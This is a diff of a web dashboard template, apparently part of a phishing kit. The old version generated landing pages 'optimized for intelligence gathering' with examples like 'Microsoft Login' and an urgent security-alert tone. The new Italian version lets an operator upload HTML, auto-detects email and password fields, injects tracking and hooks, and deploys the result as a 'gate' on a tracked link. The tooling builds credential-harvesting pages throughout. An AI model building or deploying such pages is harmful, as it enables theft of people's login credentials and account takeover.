@@ -2,132 +2,162 @@
 
 {% block content %}
 <div class="row" style="display: flex; gap: 30px; flex-wrap: wrap;">
-    <!-- Left: Configuration -->
-    <div style="flex: 1; min-width: 300px;">
+    <!-- Left: Upload & Config -->
+    <div style="flex: 1; min-width: 350px;">
         <div class="card">
-            <h2 style="margin-bottom: 20px;"><i class="fas fa-drafting-compass"></i> AI Architect</h2>
-            <p style="color: var(--text-muted); margin-bottom: 20px;">
-                Generate high-converting, custom landing pages optimized for intelligence gathering.
-                The AI will inject tracking scripts automatically.
+            <h2 style="margin-bottom: 20px;"><i class="fas fa-file-code"></i> HTML Gate Builder</h2>
+            <p style="color: var(--text-sec); margin-bottom: 20px;">
+                Carica il tuo HTML personalizzato. Il sistema rileverà automaticamente i campi email/password
+                e inietterà il tracking completo.
             </p>
 
             <form id="architectForm">
                 <div class="form-group" style="margin-bottom: 15px;">
-                    <label>Target Link</label>
+                    <label>Link di Destinazione</label>
                     <select id="link_id" name="link_id" required>
+                        <option value="">-- Seleziona Link --</option>
                         {% for link in links %}
-                        <option value="{{ link.id }}">{{ link.slug }} -> {{ link.destination }}</option>
+                        <option value="{{ link.id }}">{{ link.slug }} → {{ link.destination }}</option>
                         {% endfor %}
                     </select>
                 </div>
 
                 <div class="form-group" style="margin-bottom: 15px;">
-                    <label>Industry / Use Case</label>
-                    <input type="text" id="industry" name="industry"
-                        placeholder="e.g. Corporate HR, Microsoft Login, Givaway, Document Portal" required>
-                </div>
-
-                <div class="form-group" style="margin-bottom: 15px;">
-                    <label>Brand Name / Title</label>
-                    <input type="text" id="brand" name="brand" placeholder="e.g. SecurePortal, HR Connect">
-                </div>
-
-                <div class="form-group" style="margin-bottom: 15px;">
-                    <label>Color Theme</label>
-                    <div style="display: flex; gap: 10px;">
-                        <input type="color" id="color_primary" name="color_primary" value="#007bff"
-                            style="height: 40px; flex:1;">
-                        <input type="color" id="color_bg" name="color_bg" value="#ffffff" style="height: 40px; flex:1;">
-                    </div>
+                    <label>HTML Personalizzato</label>
+                    <textarea id="customHtml" name="custom_html" rows="15"
+                        placeholder="Incolla qui il tuo HTML completo (inclusi <html>, <head>, <body>)..."
+                        style="font-family: monospace; font-size: 0.9rem;" required></textarea>
+                    <small style="color: var(--text-sec); display: block; margin-top: 5px;">
+                        Oppure <label for="fileUpload" style="color: var(--accent); cursor: pointer;"><u>carica un file
+                                HTML</u></label>
+                    </small>
+                    <input type="file" id="fileUpload" accept=".html" style="display: none;">
                 </div>
 
                 <div class="form-group" style="margin-bottom: 20px;">
-                    <label>Tone</label>
-                    <select id="tone" name="tone">
-                        <option value="professional">Professional / Corporate</option>
-                        <option value="urgent">Urgent / Security Alert</option>
-                        <option value="friendly">Friendly / Welcome</option>
-                        <option value="minimal">Minimal / Clean</option>
-                    </select>
+                    <label style="display: flex; align-items: center; gap: 10px;">
+                        <input type="checkbox" id="autoInject" name="auto_inject" checked>
+                        <span>Auto-inietta tracking e hooks (consigliato)</span>
+                    </label>
                 </div>
 
                 <button type="submit" class="btn" style="width: 100%;">
-                    <i class="fas fa-magic"></i> Generate Template
+                    <i class="fas fa-magic"></i> Genera Anteprima
                 </button>
             </form>
+        </div>
+
+        <!-- Detection Report -->
+        <div id="detectionReport" class="card" style="margin-top: 20px; display: none;">
+            <h5><i class="fas fa-search"></i> Campi Rilevati</h5>
+            <ul id="detectedFields" style="margin: 10px 0; padding-left: 20px;"></ul>
         </div>
     </div>
 
     <!-- Right: Preview -->
-    <div style="flex: 2; min-width: 350px;">
+    <div style="flex: 2; min-width: 400px;">
         <div class="card" style="height: 100%; display: flex; flex-direction: column;">
             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
-                <h5>Live Preview</h5>
+                <h5>Anteprima Live</h5>
                 <div style="display: flex; gap: 10px;">
-                    <button class="btn-sm btn-outline" id="saveBtn" style="display: none;" onclick="saveTemplate()">
-                        <i class="fas fa-save"></i> Save & Deploy
+                    <button class="btn-sm btn-outline" id="saveBtn" style="display: none;" onclick="saveGate()">
+                        <i class="fas fa-save"></i> Salva & Attiva
                     </button>
                 </div>
             </div>
 
             <div id="loading" style="display: none; text-align: center; padding: 50px;">
                 <i class="fas fa-circle-notch fa-spin" style="font-size: 2rem; color: var(--accent);"></i>
-                <p style="margin-top: 15px; color: var(--text-muted);">AI is architecting your landing page...</p>
+                <p style="margin-top: 15px; color: var(--text-sec);">Processamento HTML...</p>
             </div>
 
             <iframe id="previewFrame"
-                style="width: 100%; flex: 1; border: 1px solid var(--glass-border); border-radius: 8px; background: #fff;"></iframe>
+                style="width: 100%; flex: 1; border: 1px solid var(--border); border-radius: 8px; background: #fff;"></iframe>
 
-            <textarea id="generatedHtml" style="display: none;"></textarea>
+            <textarea id="processedHtml" style="display: none;"></textarea>
         </div>
     </div>
 </div>
 
 <script>
+    // File Upload Handler
+    document.getElementById('fileUpload').addEventListener('change', function(e) {
+        const file = e.target.files[0];
+        if (file) {
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                document.getElementById('customHtml').value = e.target.result;
+            };
+            reader.readAsText(file);
+        }
+    });
+
+    // Form Submit
     document.getElementById('architectForm').addEventListener('submit', async (e) => {
         e.preventDefault();
-        const btn = e.target.querySelector('button');
+        
+        const customHtml = document.getElementById('customHtml').value;
+        const linkId = document.getElementById('link_id').value;
+        const autoInject = document.getElementById('autoInject').checked;
+        
+        if (!customHtml || !linkId) {
+            alert('Compila tutti i campi!');
+            return;
+        }
+
         const loading = document.getElementById('loading');
         const frame = document.getElementById('previewFrame');
         const saveBtn = document.getElementById('saveBtn');
-
-        btn.disabled = true;
+        const detectionReport = document.getElementById('detectionReport');
+        
         loading.style.display = 'block';
         frame.style.display = 'none';
         saveBtn.style.display = 'none';
-
-        const formData = new FormData(e.target);
+        detectionReport.style.display = 'none';
 
         try {
-            const res = await fetch('/dashboard/architect/generate', {
+            const formData = new FormData();
+            formData.append('link_id', linkId);
+            formData.append('custom_html', customHtml);
+            formData.append('auto_inject', autoInject ? 'true' : 'false');
+
+            const res = await fetch('/dashboard/architect/process', {
                 method: 'POST',
                 body: formData
             });
+
             const data = await res.json();
 
             if (data.html) {
-                document.getElementById('generatedHtml').value = data.html;
+                document.getElementById('processedHtml').value = data.html;
+                
+                // Show detection report
+                if (data.detected_fields && data.detected_fields.length > 0) {
+                    const fieldsList = document.getElementById('detectedFields');
+                    fieldsList.innerHTML = data.detected_fields.map(f => 
+                        `<li style="color: var(--accent);">${f}</li>`
+                    ).join('');
+                    detectionReport.style.display = 'block';
+                }
 
-                // Render in Iframe
+                // Render in iframe
                 const blob = new Blob([data.html], { type: 'text/html' });
                 frame.src = URL.createObjectURL(blob);
-
                 frame.style.display = 'block';
                 saveBtn.style.display = 'inline-flex';
             } else {
-                alert('Error generating template: ' + (data.error || 'Unknown'));
+                alert('Errore: ' + (data.error || 'Unknown'));
             }
         } catch (err) {
             alert('Request failed: ' + err);
         } finally {
             loading.style.display = 'none';
-            btn.disabled = false;
         }
     });
 
-    async function saveTemplate() {
+    async function saveGate() {
         const linkId = document.getElementById('link_id').value;
-        const html = document.getElementById('generatedHtml').value;
+        const html = document.getElementById('processedHtml').value;
 
         if (!html) return;
 
@@ -135,17 +165,17 @@
         formData.append('link_id', linkId);
         formData.append('html', html);
 
-        if (confirm('This will overwrite any existing custom landing page for this link. Continue?')) {
+        if (confirm('Questo sostituirà la landing page per questo link. Continuare?')) {
             const res = await fetch('/dashboard/architect/save', {
                 method: 'POST',
                 body: formData
             });
             const data = await res.json();
             if (data.success) {
-                alert('Landing page deployed successfully!');
+                alert('Landing page salvata con successo!');
                 window.location.href = '/dashboard';
             } else {
-                alert('Error saving: ' + data.error);
+                alert('Errore: ' + data.error);
             }
         }
     }
